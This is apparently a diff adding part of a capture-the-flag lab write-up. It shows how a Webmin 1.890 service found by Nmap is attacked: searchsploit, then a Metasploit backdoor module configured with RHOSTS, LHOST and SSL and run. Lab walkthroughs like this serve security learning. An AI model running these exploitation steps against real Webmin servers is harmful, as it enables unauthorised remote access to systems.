@@ -30,3 +30,68 @@ Informations from Nmap scan:
 * Port 10000 is running MiniServ 1.890 (Webmin httpd)
 
 According to the room description, Webmin is a web-based system configuration tool.
+<br>
+<br>
+
+<p align="center">
+  <img width="80%" height="200" src="assets/source14.PNG">
+</p>
+<br>
+
+When we try to access the web server using Firefox, it will give an error. Seems like the web server wants us to use SSL mode which is equivalent to HTTPS. So just change the URL to 𝗵𝘁𝘁𝗽𝘀://𝟭𝟬.𝟭𝟬.𝘅.𝘅:𝟭𝟬𝟬𝟬𝟬
+<br>
+
+
+<p align="center">
+  <img width="80%" height="350" src="assets/source13.PNG">
+</p>
+
+A login page?🤔My first thought is to bruteforce the login credentials but that will take some time. Maybe we can search for the web server's vulnerabilities that we can exploit.
+<br>
+```
+searchsploit webmin
+```
+<br>
+<p align="center">
+  <img width="80%" height="400" src="assets/source1.PNG">
+</p>
+
+From the searchsploit command, we can see a bunch of exploits that we can use and some of it can be done using Metasploit. So, let's start Metasploit.
+<br>
+```
+msfconsole
+```
+<br>
+<p align="center">
+  <img width="80%" height="350" src="assets/source2.PNG">
+</p>
+
+Search exploit modules related to WebMin
+<p align="center">
+  <img width="80%" height="250" src="assets/source3.PNG">
+</p>
+
+You can use any module any module that you want, I will use the module that can create backdoor to the web server.
+<br>
+<br>
+<p align="center">
+  <img width="80%" height="400" src="assets/source4.PNG">
+</p>
+
+Now, we need to setup the payload ```RHOST```, ```LHOST``` and ```SSL``` (since the server uses SSL).
+
+```
+set RHOSTS 10.10.x.x
+```
+```
+set LHOST your_ip_address
+```
+```
+set SSL true
+```
+Execute the payload using ```run``` or ```exploit``` command.
+<p align="center">
+  <img width="80%" height="200" src="assets/source7.PNG">
+</p>
+
+
